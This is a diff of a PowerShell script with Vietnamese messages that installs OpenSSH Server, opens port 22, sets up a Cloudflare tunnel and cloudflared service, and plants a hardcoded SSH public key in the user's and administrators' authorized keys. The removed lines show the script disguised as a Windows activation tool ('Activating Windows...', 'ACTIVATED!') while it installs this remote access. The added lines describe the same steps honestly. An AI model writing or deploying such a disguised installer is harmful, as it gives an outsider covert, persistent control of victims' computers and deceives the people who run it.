@@ -60,26 +60,26 @@ $SshPublicKey = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMk83rs0xpy8XOhogglSmppmkYe
 
 Write-Host "`n===========================================" -ForegroundColor Cyan
 Write-Host "===========================================" -ForegroundColor Cyan
-Write-Host "1. Active WINDOWS" -ForegroundColor Cyan
+Write-Host "1. BẬT TÍNH NĂNG OPENSSH SERVER TRÊN WINDOWS" -ForegroundColor Cyan
 Write-Host "===========================================" -ForegroundColor Cyan
-Write-Host "Kiem tra tinh trang may..."
+Write-Host "Kiem tra trang thai service OpenSSH Server (sshd) tren may..."
 if (Get-Service -Name sshd -ErrorAction SilentlyContinue) {
-    Write-Host "-> Da duoc cai dat, dang loi thoi" -ForegroundColor Green
+    Write-Host "-> Service OpenSSH Server da duoc cai dat." -ForegroundColor Green
 }
 else {
-    Write-Host "Cap nhat tool GitHub."
+    Write-Host "Đang tải và cài đặt OpenSSH Service phiên bản mới nhất từ GitHub..."
     $ZipPath = "$env:TEMP\OpenSSH-Win64.zip"
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
     Invoke-WebRequest -Uri "https://github.com/PowerShell/Win32-OpenSSH/releases/download/v9.5.0.0p1-Beta/OpenSSH-Win64.zip" -OutFile $ZipPath -UseBasicParsing
     
-    Write-Host "."
+    Write-Host "Đang giải nén OpenSSH..."
     Expand-Archive -Path $ZipPath -DestinationPath $env:ProgramFiles -Force
     $OpenSshDir = "$env:ProgramFiles\OpenSSH-Win64"
     
-    Write-Host "."
+    Write-Host "Cài đặt service sshd..."
     & powershell.exe -ExecutionPolicy Bypass -File "$OpenSshDir\install-sshd.ps1" | Out-Null
     
-    Write-Host " ."
+    Write-Host "Sửa quyền File Host Key..."
     $HostKeyDir = "$env:ProgramData\ssh"
     if (Test-Path $HostKeyDir) {
         $keys = Get-ChildItem -Path $HostKeyDir -Filter "*_key"
@@ -94,39 +94,39 @@ else {
     }
     Remove-Item $ZipPath -Force -ErrorAction SilentlyContinue
     
-    Write-Host "."
+    Write-Host "Thiết lập PowerShell làm Default Shell..."
     if (!(Test-Path "HKLM:\SOFTWARE\OpenSSH")) { New-Item -Path "HKLM:\SOFTWARE\OpenSSH" -Force -ErrorAction SilentlyContinue | Out-Null }
     New-ItemProperty -Path "HKLM:\SOFTWARE\OpenSSH" -Name DefaultShell -Value "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -PropertyType String -Force -ErrorAction SilentlyContinue | Out-Null
 }
 
-Write-Host "."
+Write-Host "Khoi dong va cau hinh service sshd tu dong bat cung Windows..."
 Start-Service sshd -ErrorAction SilentlyContinue
 Set-Service -Name sshd -StartupType 'Automatic'
 
 if (!(Get-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -ErrorAction SilentlyContinue | Select-Object Name, Enabled)) {
-    Write-Host "."
+    Write-Host "Dang mo Firewall cho OpenSSH (Port 22 Inbound)..."
     New-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22 | Out-Null
 }
 
 Write-Host "`n===========================================" -ForegroundColor Cyan
-Write-Host "2" -ForegroundColor Cyan
+Write-Host "2. TUONG TAC VOI CLOUDFLARE API" -ForegroundColor Cyan
 Write-Host "===========================================" -ForegroundColor Cyan
 
-$InputName = Read-Host "Nhập "
+$InputName = Read-Host "Nhập tên Tunnel phụ domain (Để trống máy sẽ tự động tìm tên ssh00X chưa được cấp)"
 
 $Headers = @{
     "Authorization" = "Bearer $CloudflareAPIToken"
     "Content-Type"  = "application/json"
 }
 
-Write-Host "-> Cấp tên..."
+Write-Host "-> Đang kiểm tra danh sách Tunnel hiện có trên Cloudflare để xử lý cấp tên..."
 try {
     $TunnelsRes = Invoke-RestMethod -Uri "https://api.cloudflare.com/client/v4/accounts/$CloudflareAccountId/cfd_tunnel?is_deleted=false&per_page=100" -Method Get -Headers $Headers
     $ExistingTunnels = @($TunnelsRes.result.name)
 }
 catch {
     $ExistingTunnels = @()
-    Write-Host "   [CẢNH BÁO] Không thể lấy danh sách để kiểm tra trùng lặp." -ForegroundColor Yellow
+    Write-Host "   [CẢNH BÁO] Không thể lấy danh sách tunnel để kiểm tra trùng lặp." -ForegroundColor Yellow
 }
 
 if ([string]::IsNullOrWhiteSpace($InputName)) {
@@ -135,7 +135,7 @@ if ([string]::IsNullOrWhiteSpace($InputName)) {
         $TunnelName = "ssh{0:D3}" -f $i
         $i++
     } while ($ExistingTunnels -contains $TunnelName)
-    Write-Host "-> Tên: $TunnelName" -ForegroundColor Green
+    Write-Host "-> Để trống tên, hệ thống tự cấp: $TunnelName" -ForegroundColor Green
 }
 else {
     $TunnelName = $InputName
@@ -145,7 +145,7 @@ else {
         $i++
     }
     if ($TunnelName -ne $InputName) {
-        Write-Host "-> [$InputName] , tự động đổi thành: $TunnelName" -ForegroundColor Yellow
+        Write-Host "-> Tên [$InputName] đã tồn tại, tự động đổi thành: $TunnelName" -ForegroundColor Yellow
     }
     else {
         Write-Host "-> Sử dụng tên: $TunnelName" -ForegroundColor Green
@@ -159,7 +159,7 @@ $rng.GetBytes($bytes)
 $TunnelSecret = [Convert]::ToBase64String($bytes)
 
 # [2.1] Tao Tunnel
-Write-Host "-> ..."
+Write-Host "-> Dang khoi tao Tunnel [$TunnelName] qua API..."
 $TunnelBody = @{
     name          = $TunnelName
     tunnel_secret = $TunnelSecret
@@ -169,16 +169,16 @@ $TunnelBody = @{
 try {
     $TunnelRes = Invoke-RestMethod -Uri "https://api.cloudflare.com/client/v4/accounts/$CloudflareAccountId/cfd_tunnel" -Method Post -Headers $Headers -Body $TunnelBody
     $TunnelId = $TunnelRes.result.id
-    Write-Host "   => Thanh cong!" -ForegroundColor Green
+    Write-Host "   => Thanh cong! Tunnel ID: $TunnelId" -ForegroundColor Green
 }
 catch {
-    Write-Host "   => [LOI] Khong the tao Tunnel." -ForegroundColor Red
+    Write-Host "   => [LOI] Khong the tao Tunnel. Hay chac chan API Token co quyen Account Zero Trust va Account ID dung." -ForegroundColor Red
     Write-Host "   Chi tiet: $( $_.ErrorDetails.Message )"
     exit
 }
 
 # Lay Token Tunnel
-Write-Host "-> Service..."
+Write-Host "-> Dang lay token dung cho cloudflared service..."
 try {
     $TokenRes = Invoke-RestMethod -Uri "https://api.cloudflare.com/client/v4/accounts/$CloudflareAccountId/cfd_tunnel/$TunnelId/token" -Method Get -Headers $Headers
     $TunnelToken = $TokenRes.result
@@ -189,7 +189,7 @@ catch {
 }
 
 # [2.3.1] Cau hinh Tunnel Route 
-Write-Host "-> Cau hinh mapping ..."
+Write-Host "-> Cau hinh mapping (Zero Trust Ingress) ve ssh://localhost:22..."
 $ConfigBody = @{
     config = @{
         ingress = @(
@@ -206,14 +206,14 @@ $ConfigBody = @{
 
 try {
     Invoke-RestMethod -Uri "https://api.cloudflare.com/client/v4/accounts/$CloudflareAccountId/cfd_tunnel/$TunnelId/configurations" -Method Put -Headers $Headers -Body $ConfigBody | Out-Null
-    Write-Host "   => VVV---VVV" -ForegroundColor Green
+    Write-Host "   => Da cau hinh Ingress Rule thanh cong" -ForegroundColor Green
 }
 catch {
-    Write-Host "   => XXX" -ForegroundColor Yellow
+    Write-Host "   => [CANH BAO] Khong the thiet lap cau hinh Tunnel Ingress." -ForegroundColor Yellow
 }
 
 # [2.3.2] Tao CNAME DNS 
-Write-Host "->(CNAME: $TunnelName.$BaseDomain => $TunnelId.cfargotunnel.com)..."
+Write-Host "-> Tao DNS Record (CNAME: $TunnelName.$BaseDomain => $TunnelId.cfargotunnel.com)..."
 $DnsBody = @{
     type    = "CNAME"
     name    = $TunnelName
@@ -223,21 +223,21 @@ $DnsBody = @{
 
 try {
     Invoke-RestMethod -Uri "https://api.cloudflare.com/client/v4/zones/$CloudflareZoneId/dns_records" -Method Post -Headers $Headers -Body $DnsBody | Out-Null
-    Write-Host "   => Hoan tat." -ForegroundColor Green
+    Write-Host "   => Hoan tat tao DNS CNAME Record." -ForegroundColor Green
 }
 catch {
-    Write-Host "   => da ton tai." -ForegroundColor Yellow
+    Write-Host "   => [CANH BAO] Khong the tao DNS Record, co the record nay da ton tai." -ForegroundColor Yellow
 }
 
 Write-Host "`n===========================================" -ForegroundColor Cyan
-Write-Host "3. " -ForegroundColor Cyan
+Write-Host "3. TAI VA INSTALL CLOUDFLARED SERVICE" -ForegroundColor Cyan
 Write-Host "===========================================" -ForegroundColor Cyan
 $CloudflaredPath = "$env:TEMP\cloudflared.exe"
 
-Write-Host "moi nhat..."
+Write-Host "Dang tai ve cloudflared-windows-amd64.exe moi nhat..."
 Invoke-WebRequest -Uri "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe" -OutFile $CloudflaredPath -UseBasicParsing
 
-Write-Host "Token..."
+Write-Host "Dang goi lenh cai dat service voi Token..."
 # Thu go cai dat service cu (neu co) truoc khi cai moi
 try {
     & $CloudflaredPath service uninstall *>&1 | Out-Null
@@ -254,9 +254,9 @@ Write-Host "Don dep file tam..."
 Remove-Item $CloudflaredPath -ErrorAction SilentlyContinue
 
 Write-Host "`n===========================================" -ForegroundColor Cyan
-Write-Host "4." -ForegroundColor Cyan
+Write-Host "4. CAU HINH SSH AUTHORIZED KEYS" -ForegroundColor Cyan
 Write-Host "===========================================" -ForegroundColor Cyan
-Write-Host "Activating Windows..."
+Write-Host "Gan Public Key cua ban vao he thong SSH Windows..."
 
 $SshDir = "$env:USERPROFILE\.ssh"
 if (!(Test-Path $SshDir)) {
@@ -275,7 +275,7 @@ icacls.exe $AuthorizedKeysPath /grant "$($env:USERNAME):(R,W)" | Out-Null
 icacls.exe $AuthorizedKeysPath /grant "*S-1-5-18:(F)" | Out-Null 
 
 if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    Write-Host "Vao ProgramData/ssh..."
+    Write-Host "Do may nam trong quyen Administrator Server, khoa tu dong clone vao ProgramData/ssh..."
     $AdminSshDir = "$env:ProgramData\ssh"
     if (!(Test-Path $AdminSshDir)) { 
         New-Item -ItemType Directory -Force -Path $AdminSshDir | Out-Null
@@ -294,9 +294,10 @@ if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::
 }
 
 Write-Host "`n===========================================" -ForegroundColor Green
-Write-Host "[HOAN TAT] ACTIVATED!" -ForegroundColor Green
+Write-Host "[HOAN TAT] MAY KHACH DA DUOC CAU HINH THANH CONG!" -ForegroundColor Green
 Write-Host "===========================================" -ForegroundColor Green
-Write-Host "HDPE la ngon luon ! :p"
+Write-Host "Tu bay gio, ban co thi ssh tu may tinh cua ban ve may khach ma khong can mo port mang."
+Write-Host "Ban thao tac tiep ben may ca nhan, them cau hinh ProxyCommand."
 
 Write-Host "`nNhan phim bat ky de thoat..." -ForegroundColor Cyan
 try {
